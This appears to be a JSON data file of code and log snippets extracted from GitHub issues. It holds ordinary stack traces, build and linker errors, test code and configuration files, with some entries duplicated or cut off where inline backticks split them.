        "logs": "`json\r\n{\r\n    \"version\": \"0.2.0\",\r\n    \"configurations\": [\r\n        {\r\n            \"type\": \"node\",\r\n            \"request\": \"launch\",\r\n            \"name\": \"Debug Mocha test\",\r\n            \"program\": \"${workspaceFolder}/node_modules/.bin/_mocha\",\r\n            \"args\": [\r\n                \"--inspect-brk\",\r\n                \"--recursive\",\r\n                \"--timeout\",\r\n                \"60000\",\r\n                \"${workspaceFolder}/build/compiled/test\",\r\n                \"--grep\",\r\n                \"github issues > #193\"\r\n            ],\r\n            \"preLaunchTask\": \"npm: compile\"\r\n        }\r\n    ]\r\n}\r\n"
    },
    {
        "logs": "```json\r\n{\r\n    \"version\": \"0.2.0\",\r\n    \"configurations\": [\r\n        {\r\n            \"type\": \"node\",\r\n            \"request\": \"launch\",\r\n            \"name\": \"Debug Mocha test\",\r\n            \"program\": \"${workspaceFolder}/node_modules/.bin/_mocha\",\r\n            \"args\": [\r\n                \"--inspect-brk\",\r\n                \"--recursive\",\r\n                \"--timeout\",\r\n                \"60000\",\r\n                \"${workspaceFolder}/build/compiled/test\",\r\n                \"--grep\",\r\n                \"github issues > #193\"\r\n            ],\r\n            \"preLaunchTask\": \"npm: compile\"\r\n        }\r\n    ]\r\n}\r\n"
    },
    {
        "logs": "`dart\r\n  var uri = new Uri(scheme: \"http\", host: \"\", port: 8080);\r\n  print(uri.toString()); // http://:8080\r\n  print(uri.origin); // Exception Bad state: Cannot use origin without a scheme: http://:8080\r\n"
    },
    {
        "logs": "`\r\nException ValueError: ValueError(u'to_rgba: Invalid rgba arg \"(1.0, 0.5, 0.0, 1.0)\"\\nto_rgb: Invalid rgb arg \"(1.0, 0.5, 0.0, 1.0)\"\\ncould not convert string to float: (1.0, 0.5, 0.0, 1.0)',) in <module 'threading' from '/usr/lib/python2.7/threading.pyc'> ignored"
    },
    {
        "logs": "`java.lang.NullPointerException\r\n\tat com.vaadin.flow.server.frontend.FrontendUtils.getStatsFromWebpack(FrontendUtils.java:402)...\r\n\r\n[exceptions-getStatsFromWebpack.txt](https://github.com/vaadin/flow/files/3742857/exceptions-getStatsFromWebpack.txt)\r\n"
    },
    {
        "logs": "`\r\njava.lang.NullPointerException: null\r\n\tat com.vaadin.flow.server.frontend.FrontendUtils.getStatsAssetsByChunkName(FrontendUtils.java:475) ~[flow-server-2.1.0.beta3.jar:2.1.0.beta3]\r\n\tat com.vaadin.flow.server.BootstrapHandler$BootstrapPageBuilder.appendNpmBundle(BootstrapHandler.java:853) ~[flow-server-2.1.0.beta3.jar:2.1.0.beta3]\r\n\tat com.vaadin.flow.server.BootstrapHandler$BootstrapPageBuilder.setupFrameworkLibraries(BootstrapHandler.java:835) ~[flow-server-2.1.0.beta3.jar:2.1.0.beta3]\r\n\tat com.vaadin.flow.server.BootstrapHandler$BootstrapPageBuilder.setupDocumentHead(BootstrapHandler.java:718) ~[flow-server-2.1.0.beta3.jar:2.1.0.beta3]\r\n\tat com.vaadin.flow.server.BootstrapHandler$BootstrapPageBuilder.getBootstrapPage(BootstrapHandler.java:521) ~[flow-server-2.1.0.beta3.jar:2.1.0.beta3]\r\n\tat com.vaadin.flow.server.BootstrapHandler.synchronizedHandleRequest(BootstrapHandler.java:462) ~[flow-server-2.1.0.beta3.jar:2.1.0.beta3]\r\n\tat com.vaadin.flow.server.SynchronizedRequestHandler.handleRequest(SynchronizedRequestHandler.java:40) ~[flow-server-2.1.0.beta3.jar:2.1.0.beta3]\r\n\tat com.vaadin.flow.server.VaadinService.handleRequest(VaadinService.java:1540) ~[flow-server-2.1.0.beta3.jar:2.1.0.beta3]\r\n\tat com.vaadin.flow.server.VaadinServlet.service(VaadinServlet.java:246) ~[flow-server-2.1.0.beta3.jar:2.1.0.beta3]\r\n\tat com.vaadin.flow.spring.SpringServlet.service(SpringServlet.java:95) ~[vaadin-spring-12.1.0.beta1.jar:na]\r\n\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:791) ~[javax.servlet-api-4.0.0.jar:4.0.0]\r\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) ~[tomcat-embed-core-9.0.17.jar:9.0.17]\r\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) ~[tomcat-embed-core-9.0.17.jar:9.0.17]\r\n\tat org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:712) ~[tomcat-embed-core-9.0.17.jar:9.0.17]\r\n\tat org.apache.catalina.core.ApplicationDispatcher.processRequest(ApplicationDispatcher.java:459) ~[tomcat-embed-core-9.0.17.jar:9.0.17]\r\n\tat org.apache.catalina.core.ApplicationDispatcher.doForward(ApplicationDispatcher.java:352) ~[tomcat-embed-core-9.0.17.jar:9.0.17]\r\n\tat org.apache.catalina.core.ApplicationDispatcher.forward(ApplicationDispatcher.java:312) ~[tomcat-embed-core-9.0.17.jar:9.0.17]\r\n\tat org.springframework.web.servlet.mvc.ServletForwardingController.handleRequestInternal(ServletForwardingController.java:141) ~[spring-webmvc-5.1.9.RELEASE.jar:5.1.9.RELEASE]\r\n\tat org.springframework.web.servlet.mvc.AbstractController.handleRequest(AbstractController.java:177) ~[spring-webmvc-5.1.9.RELEASE.jar:5.1.9.RELEASE]\r\n\tat org.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter.handle(SimpleControllerHandlerAdapter.java:52) ~[spring-webmvc-5.1.9.RELEASE.jar:5.1.9.RELEASE]\r\n\tat org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1039) ~[spring-webmvc-5.1.9.RELEASE.jar:5.1.9.RELEASE]\r\n"
    },
    {
        "logs": "`\r\nHTTP ERROR 500\r\nProblem accessing /ordermanager/main. Reason:\r\n\r\n    Server Error\r\nCaused by:\r\njavax.servlet.ServletException: com.vaadin.flow.server.ServiceException: java.lang.NullPointerException\r\n\tat com.vaadin.flow.server.VaadinServlet.service(VaadinServlet.java:248)\r\n\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:790)\r\n\tat org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:876)\r\n\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1623)\r\n\tat org.eclipse.jetty.websocket.server.WebSocketUpgradeFilter.doFilter(WebSocketUpgradeFilter.java:214)\r\n\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1610)\r\n\tat org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:540)\r\n\tat org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:146)\r\n\tat org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:548)\r\n\tat org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:132)\r\n\tat org.eclipse.jetty.server.handler.ScopedHandler.nextHandle(ScopedHandler.java:257)\r\n\tat org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:1711)\r\n\tat org.eclipse.jetty.server.handler.ScopedHandler.nextHandle(ScopedHandler.java:255)\r\n\tat org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1347)\r\n\tat org.eclipse.jetty.server.handler.ScopedHandler.nextScope(ScopedHandler.java:203)\r\n\tat org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:480)\r\n\tat org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:1678)\r\n\tat org.eclipse.jetty.server.handler.ScopedHandler.nextScope(ScopedHandler.java:201)\r\n\tat org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1249)\r\n\tat org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:144)\r\n\tat org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:132)\r\n\tat org.eclipse.jetty.server.Server.handle(Server.java:505)\r\n\tat org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:370)\r\n\tat org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:267)\r\n\tat org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:305)\r\n\tat org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:103)\r\n\tat org.eclipse.jetty.io.ChannelEndPoint$2.run(ChannelEndPoint.java:117)\r\n\tat org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.runTask(EatWhatYouKill.java:333)\r\n\tat org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:310)\r\n\tat org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.tryProduce(EatWhatYouKill.java:168)\r\n[Truncated]\n\tat java.lang.Thread.run(Thread.java:745)\r\nCaused by: com.vaadin.flow.server.ServiceException: java.lang.NullPointerException\r\n\tat com.vaadin.flow.server.VaadinService.handleExceptionDuringRequest(VaadinService.java:1589)\r\n\tat com.vaadin.flow.server.VaadinService.handleRequest(VaadinService.java:1552)\r\n\tat com.vaadin.flow.server.VaadinServlet.service(VaadinServlet.java:246)\r\n\t... 34 more\r\nCaused by: java.lang.NullPointerException\r\n\tat com.vaadin.flow.server.frontend.FrontendUtils.getStatsAssetsByChunkName(FrontendUtils.java:474)\r\n\tat com.vaadin.flow.server.BootstrapHandler$BootstrapPageBuilder.appendNpmBundle(BootstrapHandler.java:877)\r\n\tat com.vaadin.flow.server.BootstrapHandler$BootstrapPageBuilder.setupFrameworkLibraries(BootstrapHandler.java:859)\r\n\tat com.vaadin.flow.server.BootstrapHandler$BootstrapPageBuilder.setupDocumentHead(BootstrapHandler.java:742)\r\n\tat com.vaadin.flow.server.BootstrapHandler$BootstrapPageBuilder.getBootstrapPage(BootstrapHandler.java:517)\r\n\tat com.vaadin.flow.server.BootstrapHandler.synchronizedHandleRequest(BootstrapHandler.java:458)\r\n\tat com.vaadin.flow.server.SynchronizedRequestHandler.handleRequest(SynchronizedRequestHandler.java:40)\r\n\tat com.vaadin.flow.server.VaadinService.handleRequest(VaadinService.java:1540)\r\n\t... 35 more\r\n"
    },
    {
        "logs": "```\r\njava.lang.NullPointerException: null\r\n\tat com.vaadin.flow.server.frontend.FrontendUtils.getStatsAssetsByChunkName(FrontendUtils.java:475) ~[flow-server-2.1.0.beta3.jar:2.1.0.beta3]\r\n\tat com.vaadin.flow.server.BootstrapHandler$BootstrapPageBuilder.appendNpmBundle(BootstrapHandler.java:853) ~[flow-server-2.1.0.beta3.jar:2.1.0.beta3]\r\n\tat com.vaadin.flow.server.BootstrapHandler$BootstrapPageBuilder.setupFrameworkLibraries(BootstrapHandler.java:835) ~[flow-server-2.1.0.beta3.jar:2.1.0.beta3]\r\n\tat com.vaadin.flow.server.BootstrapHandler$BootstrapPageBuilder.setupDocumentHead(BootstrapHandler.java:718) ~[flow-server-2.1.0.beta3.jar:2.1.0.beta3]\r\n\tat com.vaadin.flow.server.BootstrapHandler$BootstrapPageBuilder.getBootstrapPage(BootstrapHandler.java:521) ~[flow-server-2.1.0.beta3.jar:2.1.0.beta3]\r\n\tat com.vaadin.flow.server.BootstrapHandler.synchronizedHandleRequest(BootstrapHandler.java:462) ~[flow-server-2.1.0.beta3.jar:2.1.0.beta3]\r\n\tat com.vaadin.flow.server.SynchronizedRequestHandler.handleRequest(SynchronizedRequestHandler.java:40) ~[flow-server-2.1.0.beta3.jar:2.1.0.beta3]\r\n\tat com.vaadin.flow.server.VaadinService.handleRequest(VaadinService.java:1540) ~[flow-server-2.1.0.beta3.jar:2.1.0.beta3]\r\n\tat com.vaadin.flow.server.VaadinServlet.service(VaadinServlet.java:246) ~[flow-server-2.1.0.beta3.jar:2.1.0.beta3]\r\n\tat com.vaadin.flow.spring.SpringServlet.service(SpringServlet.java:95) ~[vaadin-spring-12.1.0.beta1.jar:na]\r\n\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:791) ~[javax.servlet-api-4.0.0.jar:4.0.0]\r\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) ~[tomcat-embed-core-9.0.17.jar:9.0.17]\r\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) ~[tomcat-embed-core-9.0.17.jar:9.0.17]\r\n\tat org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:712) ~[tomcat-embed-core-9.0.17.jar:9.0.17]\r\n\tat org.apache.catalina.core.ApplicationDispatcher.processRequest(ApplicationDispatcher.java:459) ~[tomcat-embed-core-9.0.17.jar:9.0.17]\r\n\tat org.apache.catalina.core.ApplicationDispatcher.doForward(ApplicationDispatcher.java:352) ~[tomcat-embed-core-9.0.17.jar:9.0.17]\r\n\tat org.apache.catalina.core.ApplicationDispatcher.forward(ApplicationDispatcher.java:312) ~[tomcat-embed-core-9.0.17.jar:9.0.17]\r\n\tat org.springframework.web.servlet.mvc.ServletForwardingController.handleRequestInternal(ServletForwardingController.java:141) ~[spring-webmvc-5.1.9.RELEASE.jar:5.1.9.RELEASE]\r\n\tat org.springframework.web.servlet.mvc.AbstractController.handleRequest(AbstractController.java:177) ~[spring-webmvc-5.1.9.RELEASE.jar:5.1.9.RELEASE]\r\n\tat org.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter.handle(SimpleControllerHandlerAdapter.java:52) ~[spring-webmvc-5.1.9.RELEASE.jar:5.1.9.RELEASE]\r\n\tat org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1039) ~[spring-webmvc-5.1.9.RELEASE.jar:5.1.9.RELEASE]\r\n"
    },
    {
        "logs": "`\r\n(node:8428) Warning: Accessing non-existent property 'Characteristic' of module exports inside circular dependency\r\n(Use "
    },
    {
        "logs": "` to show where the warning was created)\r\n(node:8428) Warning: Accessing non-existent property 'Service' of module exports inside circular dependency\r\n"
    },
    {
        "logs": "```\r\n(node:8428) Warning: Accessing non-existent property 'Characteristic' of module exports inside circular dependency\r\n(Use `node --trace-warnings ...` to show where the warning was created)\r\n(node:8428) Warning: Accessing non-existent property 'Service' of module exports inside circular dependency\r\n"
    },
    {
        "logs": "`\r\nyarn run v1.22.5\r\nwarning package.json: No license field\r\nwarning vscode-test-sample@0.0.1: The engine \"vscode\" appears to be invalid.\r\n$ node ./out/sample/test/runTest.js\r\nDownloading VS Code 1.49.0 from https://update.code.visualstudio.com/1.49.0/linux-x64/stable\r\nDownloaded VS Code 1.49.0 into .vscode-test/vscode-1.49.0\r\nFound --crash-reporter-directory argument. Setting crashDumps directory to be '/home/runner/work/vscode-149-linux-crash/vscode-149-linux-crash/crash'\r\n\r\nWarning: 'sandbox' is not in the list of known options, but still passed to Electron/Chromium.\r\n\r\n[main 2020-09-13T06:14:31.876Z] update#setState idle\r\n\r\n(node:2967) Electron: Loading non-context-aware native module in renderer: '/home/runner/work/vscode-149-linux-crash/vscode-149-linux-crash/sample/.vscode-test/vscode-1.49.0/VSCode-linux-x64/resources/app/node_modules.asar.unpacked/vscode-sqlite3/build/Release/sqlite.node'. This is deprecated, see https://github.com/electron/electron/issues/18397.\r\n\r\n[2906:0913/061433.509722:FATAL:gpu_data_manager_impl_private.cc(439)] GPU process isn't usable. Goodbye.\r\n\r\n(node:2967) Electron: Loading non-context-aware native module in renderer: '/home/runner/work/vscode-149-linux-crash/vscode-149-linux-crash/sample/.vscode-test/vscode-1.49.0/VSCode-linux-x64/resources/app/node_modules.asar.unpacked/spdlog/build/Release/spdlog.node'. This is deprecated, see https://github.com/electron/electron/issues/18397.\r\n\r\nFailed to generate minidump.\r\nFailed to run tests\r\nExit code:   null\r\nSIGILL\r\nDone\r\n"
    },
    {
        "logs": "`\r\n$ tsc -p test.tsconfig.json && node ./out/test/unitTests/runTest.js\r\nmkdir: cannot create directory \u2018/run/user/1001\u2019\r\n: Permission denied\r\n"
    },
    {
        "logs": "`\r\nProblem:\r\n\r\n1. (de) Data Not Available\r\nThe data you were trying to access could not be found. It may be due to another user deleting the data or a system error. If you know the data is not deleted but cannot access it, please look at our <A href=\"{0}\" title=\"support{1}\">support</a> page.\r\n\r\n2. (fr) Data Not Available\r\nThe data you were trying to access could not be found. It may be due to another user deleting the data or a system error. If you know the data is not deleted but cannot access it, please look at our <A href=\"{0}\" title=\"support{1}\">support</a> page.\r\n"
    },
    {
        "logs": "```\r\nProblem:\r\n\r\n1. (de) Data Not Available\r\nThe data you were trying to access could not be found. It may be due to another user deleting the data or a system error. If you know the data is not deleted but cannot access it, please look at our <A href=\"{0}\" title=\"support{1}\">support</a> page.\r\n\r\n2. (fr) Data Not Available\r\nThe data you were trying to access could not be found. It may be due to another user deleting the data or a system error. If you know the data is not deleted but cannot access it, please look at our <A href=\"{0}\" title=\"support{1}\">support</a> page.\r\n"
    },
    {
        "logs": "`\r\nlld-link: error: libcmt.lib(chkstk.obj): machine type x64 conflicts with x86\r\nerror: LLDReportedFailure\r\nhacks...The following command exited with error code 1:\r\nE:\\zig\\tools\\compiler\\zig.exe build-exe E:\\zig\\projects\\hacks\\src\\main.zig E:\\zig\\projects\\hacks\\zig-cache\\o\\369fff57f898bef605621ddcfd3dcaa5\\clib32.lib -lc -OReleaseSafe --cache-dir E:\\zig\\projects\\hacks\\zig-cache --global-cache-dir C:\\Users\\admin\\AppData\\Local\\zig --name hacks -target i386-windows-msvc -mcpu pentium4 --enable-cache\r\nerror: the following build command failed with exit code 1:\r\nE:\\zig\\projects\\hacks\\zig-cache\\o\\8d8f04730fdce8d329f912f6adbef206\\build.exe E:\\zig\\tools\\compiler\\zig.exe E:\\zig\\projects\\hacks E:\\zig\\projects\\hacks\\zig-cache C:\\Users\\admin\\AppData\\Local\\zig\r\n"
    },
    {
        "logs": "`\r\nerror: AccessDenied\r\nhacks...The following command exited with error code 1:\r\nE:\\zig\\tools\\compiler\\zig.exe build-exe E:\\zig\\projects\\hacks\\src\\main.zig E:\\zig\\projects\\hacks\\zig-cache\\o\\369fff57f898bef605621ddcfd3dcaa5\\clib32.lib -lc -OReleaseSafe --cache-dir E:\\zig\\projects\\hacks\\zig-cache --global-cache-dir C:\\Users\\admin\\AppData\\Local\\zig --name hacks -target i386-windows-msvc -mcpu pentium4 --enable-cache\r\nerror: the following build command failed with exit code 1:\r\nE:\\zig\\projects\\hacks\\zig-cache\\o\\8d8f04730fdce8d329f912f6adbef206\\build.exe E:\\zig\\tools\\compiler\\zig.exe E:\\zig\\projects\\hacks E:\\zig\\projects\\hacks\\zig-cache C:\\Users\\admin\\AppData\\Local\\zig\r\n"
    },
    {
        "logs": "```\r\nlld-link: error: libcmt.lib(chkstk.obj): machine type x64 conflicts with x86\r\nerror: LLDReportedFailure\r\nhacks...The following command exited with error code 1:\r\nE:\\zig\\tools\\compiler\\zig.exe build-exe E:\\zig\\projects\\hacks\\src\\main.zig E:\\zig\\projects\\hacks\\zig-cache\\o\\369fff57f898bef605621ddcfd3dcaa5\\clib32.lib -lc -OReleaseSafe --cache-dir E:\\zig\\projects\\hacks\\zig-cache --global-cache-dir C:\\Users\\admin\\AppData\\Local\\zig --name hacks -target i386-windows-msvc -mcpu pentium4 --enable-cache\r\nerror: the following build command failed with exit code 1:\r\nE:\\zig\\projects\\hacks\\zig-cache\\o\\8d8f04730fdce8d329f912f6adbef206\\build.exe E:\\zig\\tools\\compiler\\zig.exe E:\\zig\\projects\\hacks E:\\zig\\projects\\hacks\\zig-cache C:\\Users\\admin\\AppData\\Local\\zig\r\n"
    },
    {
        "logs": "`\r\nThere was an error while starting the test runner:\r\nError: No tests defined! using source folder: /tmp/tmp-19wODo22pfsHgW/features\r\n    at /home/node/node_modules/nightwatch/lib/runner/run.js:213:20\r\n    at /home/node/node_modules/nightwatch/lib/runner/walk.js:161:15\r\n    at /home/node/node_modules/nightwatch/lib/runner/walk.js:76:13\r\n    at FSReqWrap.oncomplete (fs.js:123:15)\r\n[09:58:09] 'task1' errored after 4.19 s\r\n[09:58:09] Error in plugin 'gulp-nightwatch'\r\nMessage:\r\n    nightwatch exited with code 1\r\nDetails:\r\n    domainEmitter: [object Object]\r\n    domain: [object Object]\r\n    domainThrown: false\r\n[09:58:09] 'default' errored after 4.2 s\r\n[09:58:09] The following tasks did not complete: task2\r\n[09:58:09] Did you forget to signal async completion?\r\n"
    },
    {
        "logs": "```\r\nThere was an error while starting the test runner:\r\nError: No tests defined! using source folder: /tmp/tmp-19wODo22pfsHgW/features\r\n    at /home/node/node_modules/nightwatch/lib/runner/run.js:213:20\r\n    at /home/node/node_modules/nightwatch/lib/runner/walk.js:161:15\r\n    at /home/node/node_modules/nightwatch/lib/runner/walk.js:76:13\r\n    at FSReqWrap.oncomplete (fs.js:123:15)\r\n[09:58:09] 'task1' errored after 4.19 s\r\n[09:58:09] Error in plugin 'gulp-nightwatch'\r\nMessage:\r\n    nightwatch exited with code 1\r\nDetails:\r\n    domainEmitter: [object Object]\r\n    domain: [object Object]\r\n    domainThrown: false\r\n[09:58:09] 'default' errored after 4.2 s\r\n[09:58:09] The following tasks did not complete: task2\r\n[09:58:09] Did you forget to signal async completion?\r\n"
    },
    {
        "logs": "`\r\nimport numpy as np\r\nimport os\r\nimport tensorflow as tf\r\nfrom tensorflow.python.platform import test\r\n\r\n\r\nclass AllreduceTest(test.TestCase):\r\n    def dumpFailure(self, my_rank, num_ranks, first_output, second_output):\r\n        out_dims = first_output.shape\r\n        assert(len(out_dims) == 2)\r\n        for i in range(out_dims[0]):\r\n            for j in range(out_dims[1]):\r\n                if first_output[i][j] != second_output[i][j]:\r\n                    print(\"{}: [{}][{}]: {} {}\"\r\n                          .format(my_rank, i, j, first_output[i][j],\r\n                                  second_output[i][j]),\r\n                          flush=True)\r\n\r\n    def test_mpi_allreduce(self):\r\n        num_gpus = len(os.environ['CUDA_VISIBLE_DEVICES'].split(','))\r\n        gpu_indices = [index for index in range(num_gpus)]\r\n\r\n        mat_dim = 3072\r\n\r\n        outputs = []\r\n        for index in gpu_indices:\r\n            with tf.device(\"/gpu:{}\".format(index)):\r\n                initer = tf.random_uniform_initializer(-0.1, 0.1, seed=1234,\r\n                                                       dtype=tf.float32)\r\n                outputs.append(tf.get_variable(\"outputs-{}\".format(index),\r\n                                               shape=(mat_dim, mat_dim),\r\n                                               dtype=tf.float32,\r\n                                               initializer=initer))\r\n\r\n        # Session to test initialization across multiple GPUs\r\n        gpu_options = tf.GPUOptions(\r\n            visible_device_list=','.join(str(idx) for idx in gpu_indices))\r\n        config = tf.ConfigProto(gpu_options=gpu_options)\r\n        with tf.Session(config=config) as sess:\r\n            sess.run(tf.global_variables_initializer())\r\n            output_result = sess.run(outputs)\r\n            for index in gpu_indices:\r\n                if not np.allclose(output_result[0], output_result[index]):\r\n                    print(\"CRAP: Init outputs 0 and {} do not match\"\r\n                          .format(index), flush=True)\r\n                    self.dumpFailure(index, num_gpus, output_result[0],\r\n                                     output_result[index])\r\n                    assert(np.allclose(output_result[0],\r\n                                       output_result[index]))\r\n\r\nif __name__ == '__main__':\r\n    test.main()\r\n"
    },
    {
        "logs": "```\r\nimport numpy as np\r\nimport os\r\nimport tensorflow as tf\r\nfrom tensorflow.python.platform import test\r\n\r\n\r\nclass AllreduceTest(test.TestCase):\r\n    def dumpFailure(self, my_rank, num_ranks, first_output, second_output):\r\n        out_dims = first_output.shape\r\n        assert(len(out_dims) == 2)\r\n        for i in range(out_dims[0]):\r\n            for j in range(out_dims[1]):\r\n                if first_output[i][j] != second_output[i][j]:\r\n                    print(\"{}: [{}][{}]: {} {}\"\r\n                          .format(my_rank, i, j, first_output[i][j],\r\n                                  second_output[i][j]),\r\n                          flush=True)\r\n\r\n    def test_mpi_allreduce(self):\r\n        num_gpus = len(os.environ['CUDA_VISIBLE_DEVICES'].split(','))\r\n        gpu_indices = [index for index in range(num_gpus)]\r\n\r\n        mat_dim = 3072\r\n\r\n        outputs = []\r\n        for index in gpu_indices:\r\n            with tf.device(\"/gpu:{}\".format(index)):\r\n                initer = tf.random_uniform_initializer(-0.1, 0.1, seed=1234,\r\n                                                       dtype=tf.float32)\r\n                outputs.append(tf.get_variable(\"outputs-{}\".format(index),\r\n                                               shape=(mat_dim, mat_dim),\r\n                                               dtype=tf.float32,\r\n                                               initializer=initer))\r\n\r\n        # Session to test initialization across multiple GPUs\r\n        gpu_options = tf.GPUOptions(\r\n            visible_device_list=','.join(str(idx) for idx in gpu_indices))\r\n        config = tf.ConfigProto(gpu_options=gpu_options)\r\n        with tf.Session(config=config) as sess:\r\n            sess.run(tf.global_variables_initializer())\r\n            output_result = sess.run(outputs)\r\n            for index in gpu_indices:\r\n                if not np.allclose(output_result[0], output_result[index]):\r\n                    print(\"CRAP: Init outputs 0 and {} do not match\"\r\n                          .format(index), flush=True)\r\n                    self.dumpFailure(index, num_gpus, output_result[0],\r\n                                     output_result[index])\r\n                    assert(np.allclose(output_result[0],\r\n                                       output_result[index]))\r\n\r\nif __name__ == '__main__':\r\n    test.main()\r\n"
    },
    {
        "logs": "`\r\nPerforming 2 actions (5 in parallel)\r\n[1/2] Link libUE4Editor-NdiMedia.so\r\n/usr/bin/ld: /home/username_0/Documents/Unreal Projects/MyProject/Plugins/NdiMedia/ThirdParty/lib/linux/x86_64-linux-gnu-5.4/libndi.a(Processing.NDI.Find.o): r\u00e9adressage de R_X86_64_32 en vertu de \u00ab\u00a0__gxx_personality_v0\u00a0\u00bb ne peut \u00eatre utilis\u00e9 lors de la cr\u00e9ation d'un objet partag\u00e9; recompilez avec -fPIC\r\n/home/username_0/Documents/Unreal Projects/MyProject/Plugins/NdiMedia/ThirdParty/lib/linux/x86_64-linux-gnu-5.4/libndi.a\u00a0: erreur lors de l'ajout de symboles\u00a0: Mauvaise valeur\r\nclang: error: linker command failed with exit code 1 (use -v to see invocation)\r\nERROR: UBT ERROR: Failed to produce item: /home/username_0/Documents/Unreal Projects/MyProject/Plugins/NdiMedia/Binaries/Linux/libUE4Editor-NdiMedia.so\r\nTotal build time: 34,06 seconds (Local executor: 0,00 seconds)\r\nLogInit:Warning: Still incompatible or missing module: libUE4Editor-NdiMedia.so\r\nLogInit:Warning: Still incompatible or missing module: libUE4Editor-NdiMediaEditor.so\r\n\r\n"
    },
    {
        "logs": "`\r\nimport { OpenIdConnectConfiguration } from \"aurelia-open-id-connect\";\r\nimport { UserManagerSettings, WebStorageStateStore } from \"oidc-client\";\r\n\r\nconst appHost = \"http://localhost:9000\";\r\n\r\nexport default {\r\n  loginRedirectRoute: \"/private\",\r\n  logoutRedirectRoute: \"/index\",\r\n  unauthorizedRedirectRoute: \"/index\",\r\n  userManagerSettings: {\r\n\r\n    // The number of seconds in advance of access token expiry\r\n    // to raise the access token expiring event.\r\n    accessTokenExpiringNotificationTime: 1,\r\n\r\n    // Either host your own OpenID Provider or select a certified authority\r\n    // from the list http://openid.net/certification/\r\n    authority: \"http://localhost/CustomerName/Identity/\",\r\n\r\n    automaticSilentRenew: true,\r\n\r\n    // IdentityServer4 supports OpenID Connect Session Management\r\n    // https://openid.net/specs/openid-connect-session-1_0.html\r\n    monitorSession: true,\r\n    checkSessionInterval: 2000,\r\n\r\n    // The client or application ID that the authority issues.\r\n    client_id: \"CustomerClient\",\r\n\r\n    filterProtocolClaims: true,\r\n    loadUserInfo: false,\r\n    post_logout_redirect_uri: "
    },
    {
        "logs": "`,\r\n    response_type: \"id_token\",\r\n    scope: \"openid jcc-setup\",\r\n    // number of millisecods to wait for the authorization\r\n    // server to response to silent renew request\r\n    silentRequestTimeout: 10000,\r\n    silent_redirect_uri: "
    },
    {
        "logs": "```\r\nimport { OpenIdConnectConfiguration } from \"aurelia-open-id-connect\";\r\nimport { UserManagerSettings, WebStorageStateStore } from \"oidc-client\";\r\n\r\nconst appHost = \"http://localhost:9000\";\r\n\r\nexport default {\r\n  loginRedirectRoute: \"/private\",\r\n  logoutRedirectRoute: \"/index\",\r\n  unauthorizedRedirectRoute: \"/index\",\r\n  userManagerSettings: {\r\n\r\n    // The number of seconds in advance of access token expiry\r\n    // to raise the access token expiring event.\r\n    accessTokenExpiringNotificationTime: 1,\r\n\r\n    // Either host your own OpenID Provider or select a certified authority\r\n    // from the list http://openid.net/certification/\r\n    authority: \"http://localhost/CustomerName/Identity/\",\r\n\r\n    automaticSilentRenew: true,\r\n\r\n    // IdentityServer4 supports OpenID Connect Session Management\r\n    // https://openid.net/specs/openid-connect-session-1_0.html\r\n    monitorSession: true,\r\n    checkSessionInterval: 2000,\r\n\r\n    // The client or application ID that the authority issues.\r\n    client_id: \"CustomerClient\",\r\n\r\n    filterProtocolClaims: true,\r\n    loadUserInfo: false,\r\n    post_logout_redirect_uri: `${appHost}/signout-oidc`,\r\n    redirect_uri: `${appHost}/signin-oidc`,\r\n    response_type: \"id_token\",\r\n    scope: \"openid jcc-setup\",\r\n    // number of millisecods to wait for the authorization\r\n    // server to response to silent renew request\r\n    silentRequestTimeout: 10000,\r\n    silent_redirect_uri: `${appHost}/signin-oidc`,\r\n    userStore: new WebStorageStateStore({\r\n      prefix: \"oidc\",\r\n      store: window.localStorage,\r\n    }),\r\n  } as UserManagerSettings,\r\n} as OpenIdConnectConfiguration;\r\n\r\n"
    },
    {
